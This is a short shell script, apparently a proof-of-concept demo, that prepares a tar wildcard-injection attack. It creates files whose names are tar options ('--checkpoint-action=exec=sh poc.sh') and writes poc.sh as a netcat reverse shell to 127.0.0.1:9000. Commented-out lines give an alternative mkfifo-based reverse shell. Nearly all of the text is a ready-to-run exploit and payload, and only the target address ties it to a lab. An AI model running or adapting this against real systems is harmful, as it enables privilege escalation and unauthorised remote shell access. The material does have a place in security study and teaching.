#!/usr/bin/sh

printf "\n##### Create wildcard exploit demo #####\n\n"
mkdir demo-exploit
cd demo-exploit
touch -- --checkpoint=1
touch -- "--checkpoint-action=exec=sh poc.sh"

# Create the reverse shell
# echo 'nc -e /usr/bin/bash 127.0.0.1 9000' > poc.sh
# The command below is for netcat that does not support the -e flag
#echo 'rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/usr/bin/sh -i 2>&1|nc 127.0.0.1 9000 >/tmp/f' > poc.sh
echo 'nc -e /usr/bin/sh 127.0.0.1 9000' > poc.sh
chmod +x poc.sh
